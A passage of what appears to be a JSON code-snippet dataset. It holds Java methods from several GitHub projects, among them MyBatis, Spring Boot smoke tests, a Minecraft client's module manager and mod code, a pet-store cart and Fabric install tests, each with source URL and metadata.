"url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33124, "method_name": "register", "class_name": "TypeHandlerRegistry", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void register(String packageName) {\n    ResolverUtil<Class<?>> resolverUtil = new ResolverUtil<>();\n    resolverUtil.find(new ResolverUtil.IsA(TypeHandler.class), packageName);\n    Set<Class<? extends Class<?>>> handlerSet = resolverUtil.getClasses();\n    for (Class<?> type : handlerSet) {\n      //Ignore inner classes and interfaces (including package-info.java) and abstract classes\n      if (!type.isAnonymousClass() && !type.isInterface() && !Modifier.isAbstract(type.getModifiers())) {\n        register(type);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33125, "method_name": "getTypeHandlers", "class_name": "TypeHandlerRegistry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<TypeHandler>", "snippet": "  public Collection<TypeHandler<?>> getTypeHandlers() {\n    return Collections.unmodifiableCollection(allTypeHandlersMap.values());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TypeHandlerRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33126, "method_name": "getIssPosition", "class_name": "IssApiControllers", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getIssPosition() {\n        String url = \"http://api.open-notify.org/iss-now.json\";\n        RestTemplate restTemplate = new RestTemplate();\n        HttpEntity httpEntityISS = new HttpEntity(iss);\n        ResponseEntity<ISS> exchange = restTemplate.exchange(url, HttpMethod.GET, httpEntityISS, ISS.class);\n        this.iss = exchange.getBody();\n        issData.setLat(iss.getIssPosition().getLatitude());\n        issData.setLon(iss.getIssPosition().getLongitude());\n    }", "url": "https://raw.githubusercontent.com/wojciechgalach/PositionInternationalSpaceStation/master/src/main/java/pl/com/nur/internationalspacestation/internationalspacestation/controller/IssApiControllers.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33127, "method_name": "contextLoads", "class_name": "SampleJerseyApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid contextLoads() {\n\t\tResponseEntity<String> entity = this.restTemplate.getForEntity(\"/hello\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-jersey/src/test/java/smoketest/jersey/SampleJerseyApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33128, "method_name": "reverse", "class_name": "SampleJerseyApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid reverse() {\n\t\tResponseEntity<String> entity = this.restTemplate.getForEntity(\"/reverse?input=olleh\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(entity.getBody()).isEqualTo(\"hello\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-jersey/src/test/java/smoketest/jersey/SampleJerseyApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33129, "method_name": "validation", "class_name": "SampleJerseyApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid validation() {\n\t\tResponseEntity<String> entity = this.restTemplate.getForEntity(\"/reverse\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-jersey/src/test/java/smoketest/jersey/SampleJerseyApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33130, "method_name": "actuatorStatus", "class_name": "SampleJerseyApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid actuatorStatus() {\n\t\tResponseEntity<String> entity = this.restTemplate.getForEntity(\"/actuator/health\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(entity.getBody()).isEqualTo(\"{\\\"status\\\":\\\"UP\\\"}\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-jersey/src/test/java/smoketest/jersey/SampleJerseyApplicationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33131, "method_name": "load", "class_name": "ModuleManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void load() {\n        super.load();\n        register(new Commands(), new KeyBinds(), new Sprint(), new Speed(), new Velocity(), new KillAura(), new Flight(), new Timer()\n                , new NoRotate(), new NoFall(), new VisualRange(), new Criticals(), new DiscordRPC()\n                , new AutoFish(), new ChatSuffix(), new Phase(), new Freecam(), new Crasher(), new AntiCrash()\n                , new AutoReply(), new FurryChat(), new FastBow(), new FastPlace(), new AutoTotem()\n                , new AutoWeb(), new Surround(), new AntiHunger(), new GodMode(), new AntiChainPop(), new NoPush(), new Step()\n                , new TotemDetector(), new CaptchaSolver(), new Jesus(), new EntityESP(), new Handshake(), new AntiVoid(), new FullBright()\n                , new PacketCancel(), new SpeedMine(), new BanWave()\n                , new HitEffects(), new HUD(), new Translator(), new ScreenMove());\n        getRegistry().values().forEach(Module::init);\n        this.loadCheats();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33132, "method_name": "getToggles", "class_name": "ModuleManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Module>", "snippet": "    public List<Module> getToggles() {\n        List<Module> toggleableModules = new ArrayList<>();\n        for(Module module : getValues()) {\n            if(module instanceof Module && !module.isPersistent())\n                toggleableModules.add(module);\n        }\n        return toggleableModules;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33133, "method_name": "unload", "class_name": "ModuleManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void unload() {\n        this.saveCheats();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33134, "method_name": "getAlias", "class_name": "ModuleManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Module", "snippet": "    public Module getAlias(final String name) {\n        for (final Module f : this.getRegistry().values()) {\n            if (f.getLabel().equalsIgnoreCase(name)) {\n                return f;\n            }\n            String[] alias;\n            for (int length = (alias = f.getAlias()).length, i = 0; i < length; ++i) {\n                final String s = alias[i];\n                if (s.equalsIgnoreCase(name)) {\n                    return f;\n                }\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33135, "method_name": "getModsInCategory", "class_name": "ModuleManager", "params": ["Category"], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Module>", "snippet": "    public ArrayList<Module> getModsInCategory(final Category category) {\n        final ArrayList<Module> mods = new ArrayList<>();\n        for (final Module m : this.getRegistry().values()) {\n            if (m.getCategory().equals(category)) {\n                mods.add(m);\n            }\n        }\n        return mods;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33136, "method_name": "register", "class_name": "ModuleManager", "params": ["Module"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void register(Module... modules) {\n        for (Module cheat : modules) {\n            if (cheat.getLabel() != null)\n            include(cheat.getLabel().toLowerCase(), cheat);\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33137, "method_name": "find", "class_name": "ModuleManager", "params": ["Class<Module>"], "throws": null, "modifiers": ["public"], "return_type": "Module", "snippet": "    public Module find(Class<? extends Module> clazz) {\n        return getValues().stream().filter(m -> m.getClass() == clazz).findFirst().orElse(null);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33138, "method_name": "find", "class_name": "ModuleManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Module", "snippet": "    public Module find(String find) {\n        Module m = pull(find.replaceAll(\" \", \"\"));\n        if (pull(find.replaceAll(\" \", \"\")) != null)\n            m = pull(find.replaceAll(\" \", \"\"));\n        if (getAlias(find) != null)\n            m = getAlias(find);\n        return m;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33139, "method_name": "saveCheats", "class_name": "ModuleManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void saveCheats() {\n        if (getRegistry().values().isEmpty()) {\n            directory.delete();\n        }\n        File[] files = directory.listFiles();\n        if (!directory.exists()) {\n            directory.mkdir();\n        } else if (files != null) {\n            for (File file : files) {\n                file.delete();\n            }\n        }\n        getRegistry().values().forEach(module -> {\n            File file = new File(directory, module.getLabel() + \".json\");\n            JsonObject node = new JsonObject();\n            module.save(node);\n            if (node.entrySet().isEmpty()) {\n                return;\n            }\n            try {\n                file.createNewFile();\n            } catch (IOException e) {\n                return;\n            }\n            try (Writer writer = new FileWriter(file)) {\n                writer.write(new GsonBuilder().setPrettyPrinting().create().toJson(node));\n            } catch (IOException e) {\n                file.delete();\n            }\n        });\n        files = directory.listFiles();\n        if (files == null || files.length == 0) {\n            directory.delete();\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33140, "method_name": "loadCheats", "class_name": "ModuleManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadCheats() {\n        getRegistry().values().forEach(module -> {\n            if (module.isPersistent())\n                module.setEnabled(true);\n            final File file = new File(directory, module.getLabel() + \".json\");\n            if (!file.exists()) {\n                return;\n            }\n            try (Reader reader = new FileReader(file)) {\n                JsonElement node = new JsonParser().parse(reader);\n                if (!node.isJsonObject()) {\n                    return;\n                }\n                module.load(node.getAsJsonObject());\n            } catch (IOException e) {\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/ModuleManager.java", "stars": "12", "class_props": {"extends": "HashMapManager", "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33141, "method_name": "getCartItems", "class_name": "Cart", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Iterator<CartItem>", "snippet": "  public Iterator<CartItem> getCartItems() {\n    return itemList.iterator();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33142, "method_name": "getCartItemList", "class_name": "Cart", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<CartItem>", "snippet": "  public List<CartItem> getCartItemList() {\n    return itemList;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33143, "method_name": "getNumberOfItems", "class_name": "Cart", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumberOfItems() {\n    return itemList.size();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33144, "method_name": "containsItemId", "class_name": "Cart", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean containsItemId(String itemId) {\n    return itemMap.containsKey(itemId);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33145, "method_name": "addItem", "class_name": "Cart", "params": ["Item", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addItem(Item item, boolean isInStock) {\n    CartItem cartItem = itemMap.get(item.getItemId());\n    if (cartItem == null) {\n      cartItem = new CartItem();\n      cartItem.setItem(item);\n      cartItem.setQuantity(0);\n      cartItem.setInStock(isInStock);\n      itemMap.put(item.getItemId(), cartItem);\n      itemList.add(cartItem);\n    }\n    cartItem.incrementQuantity();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33146, "method_name": "removeItemById", "class_name": "Cart", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Item", "snippet": "  public Item removeItemById(String itemId) {\n    CartItem cartItem = itemMap.remove(itemId);\n    if (cartItem == null) {\n      return null;\n    } else {\n      itemList.remove(cartItem);\n      return cartItem.getItem();\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33147, "method_name": "incrementQuantityByItemId", "class_name": "Cart", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void incrementQuantityByItemId(String itemId) {\n    CartItem cartItem = itemMap.get(itemId);\n    cartItem.incrementQuantity();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33148, "method_name": "setQuantityByItemId", "class_name": "Cart", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setQuantityByItemId(String itemId, int quantity) {\n    CartItem cartItem = itemMap.get(itemId);\n    cartItem.setQuantity(quantity);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33149, "method_name": "getSubTotal", "class_name": "Cart", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "  public BigDecimal getSubTotal() {\n    BigDecimal subTotal = new BigDecimal(\"0\");\n    Iterator<CartItem> items = getCartItems();\n    while (items.hasNext()) {\n      CartItem cartItem = items.next();\n      Item item = cartItem.getItem();\n      BigDecimal listPrice = item.getListPrice();\n      BigDecimal quantity = new BigDecimal(String.valueOf(cartItem.getQuantity()));\n      subTotal = subTotal.add(listPrice.multiply(quantity));\n    }\n    return subTotal;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/Cart.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33150, "method_name": "isDebugEnabled", "class_name": "Log4j2LoggerImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isDebugEnabled() {\n    return log.isDebugEnabled();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2LoggerImpl.java", "stars": "15", "class_props": {"extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"id": 33151, "method_name": "isTraceEnabled", "class_name": "Log4j2LoggerImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isTraceEnabled() {\n    return log.isTraceEnabled();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2LoggerImpl.java", "stars": "15", "class_props": {"extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"id": 33152, "method_name": "error", "class_name": "Log4j2LoggerImpl", "params": ["String", "Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void error(String s, Throwable e) {\n    log.error(MARKER, s, e);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2LoggerImpl.java", "stars": "15", "class_props": {"extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"id": 33153, "method_name": "error", "class_name": "Log4j2LoggerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void error(String s) {\n    log.error(MARKER, s);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2LoggerImpl.java", "stars": "15", "class_props": {"extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"id": 33154, "method_name": "debug", "class_name": "Log4j2LoggerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void debug(String s) {\n    log.debug(MARKER, s);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2LoggerImpl.java", "stars": "15", "class_props": {"extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"id": 33155, "method_name": "trace", "class_name": "Log4j2LoggerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void trace(String s) {\n    log.trace(MARKER, s);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2LoggerImpl.java", "stars": "15", "class_props": {"extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"id": 33156, "method_name": "warn", "class_name": "Log4j2LoggerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void warn(String s) {\n    log.warn(MARKER, s);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2LoggerImpl.java", "stars": "15", "class_props": {"extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"id": 33157, "method_name": "monodroidAddReference", "class_name": "ActivityIndicatorRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ActivityIndicatorRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 33158, "method_name": "monodroidClearReferences", "class_name": "ActivityIndicatorRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ActivityIndicatorRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 33159, "method_name": "initElements", "class_name": "GlowstoneOreBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/GlowstoneOreBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 33160, "method_name": "init", "class_name": "GlowstoneOreBlock", "params": ["FMLCommonSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init(FMLCommonSetupEvent event) {\n\t\tfor (Biome biome : ForgeRegistries.BIOMES.getValues()) {\n\t\t\tboolean biomeCriteria = false;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"nether\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (!biomeCriteria)\n\t\t\t\tcontinue;\n\t\t\tbiome.addFeature(GenerationStage.Decoration.UNDERGROUND_ORES, new OreFeature(OreFeatureConfig::deserialize) {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean place(IWorld world, ChunkGenerator generator, Random rand, BlockPos pos, OreFeatureConfig config) {\n\t\t\t\t\tDimensionType dimensionType = world.getDimension().getType();\n\t\t\t\t\tboolean dimensionCriteria = false;\n\t\t\t\t\tif (dimensionType == DimensionType.THE_NETHER)\n\t\t\t\t\t\tdimensionCriteria = true;\n\t\t\t\t\tif (!dimensionCriteria)\n\t\t\t\t\t\treturn false;\n\t\t\t\t\treturn super.place(world, generator, rand, pos, config);\n\t\t\t\t}\n\t\t\t}.withConfiguration(new OreFeatureConfig(OreFeatureConfig.FillerBlockType.create(\"glowstoneore\", \"glowstoneore\", blockAt -> {\n\t\t\t\tboolean blockCriteria = false;\n\t\t\t\tif (blockAt.getBlock() == Blocks.GLOWSTONE.getDefaultState().getBlock())\n\t\t\t\t\tblockCriteria = true;\n\t\t\t\tif (blockAt.getBlock() == Blocks.NETHERRACK.getDefaultState().getBlock())\n\t\t\t\t\tblockCriteria = true;\n\t\t\t\treturn blockCriteria;\n\t\t\t}), block.getDefaultState(), 16)).withPlacement(Placement.COUNT_RANGE.configure(new CountRangeConfig(10, 0, 0, 256))));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/GlowstoneOreBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 33161, "method_name": "getPickBlock", "class_name": "CustomBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\n\t\t\treturn new ItemStack(GlowstoneOreBlock.block, (int) (1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/GlowstoneOreBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 33162, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(GlowstoneShardItem.block, (int) (3)));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/GlowstoneOreBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 33163, "method_name": "testPackRoleFile", "class_name": "InstallTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testPackRoleFile() {\n        OSEnum osType;\n        if (OSinfo.isWindows()) {\n            osType = OSEnum.WINDOWS;\n        } else if (OSinfo.isMacOS() || OSinfo.isMacOSX()) {\n            osType = OSEnum.MAC;\n        } else {\n            osType = OSEnum.LINUX;\n        }\n\n        List<RoleEnum> roleList = new ArrayList<>();\n        roleList.add(RoleEnum.PEER);\n        /*String packFilePath = installBiz.packInstallFiles(\"172.100.10.4\", roleList, osType);\n        System.out.println(\"\u5b89\u88c5\u5305\u8def\u5f84: \" + packFilePath);*/\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-main/src/test/java/InstallTest.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33164, "method_name": "testDownloadFile", "class_name": "InstallTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testDownloadFile() throws Exception {\n        MvcResult mvcResult = mockMvc.perform(MockMvcRequestBuilders.get(\"/v1/install/getPackage/MAC\")).andReturn();\n        System.out.println(mvcResult.getResponse().getContentAsString());\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-main/src/test/java/InstallTest.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33165, "method_name": "testSendUpdateCmd", "class_name": "InstallTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSendUpdateCmd() throws Exception {\n        String filePath = \"/resources/generateInstallPackage/masterPackage/initconfig.propertise\";\n        File file = new File(filePath);\n        System.out.println(file.getParent());\n        System.out.println(new File(file.getParent()).getName());\n\n        UpdateCmd cmd = new UpdateCmd();\n        /*cmd.setRole(RoleEnum.WEB);*/\n\n        MockMultipartFile firstFile = new MockMultipartFile(\"file\", \"filename.txt\", null, \"some xml\".getBytes());\n        MockMultipartFile jsonFile = new MockMultipartFile(\"content\", \"\", \"application/json\", JSONObject.toJSONString(cmd).getBytes());\n\n        MvcResult mvcResult = mockMvc.perform(MockMvcRequestBuilders.multipart(\"/v1/install/update\").file(firstFile).file(jsonFile)).andReturn();\n        System.out.println(mvcResult.getResponse().getContentAsString());\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-main/src/test/java/InstallTest.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33166, "method_name": "testDb", "class_name": "InstallTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testDb() {\n        NodeDO nodeDO = new NodeDO();\n        nodeDO.setOrgMspId(\"Org1MSP\");\n        nodeDO.setHostName(\"order.example.com\");\n        nodeDO.setRole(RoleEnum.ORDER);\n        nodeDO.setIp(\"127.0.0.1\");\n        nodeDO.setPort(7070);\n        nodeDO.setStatus(InstallStatusEnum.SUCCESS);\n        try {\n            checkPointDb.addNodeRecord(nodeDO);\n\n            List<NodeDO> found = checkPointDb.find(nodeDO);\n            System.out.println(found.size());\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-main/src/test/java/InstallTest.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33167, "method_name": "onCreateViewHolder", "class_name": "ProjectsListsAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ProjectsListsAdapter", "snippet": "    public ProjectsListsAdapter.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n        View view = activity.getLayoutInflater().inflate(R.layout.market_recycler_view_item_projects, parent, false);\n        return new ViewHolder(view);\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/ProjectsListsAdapter.java", "stars": "4", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 33168, "method_name": "onBindViewHolder", "class_name": "ProjectsListsAdapter", "params": 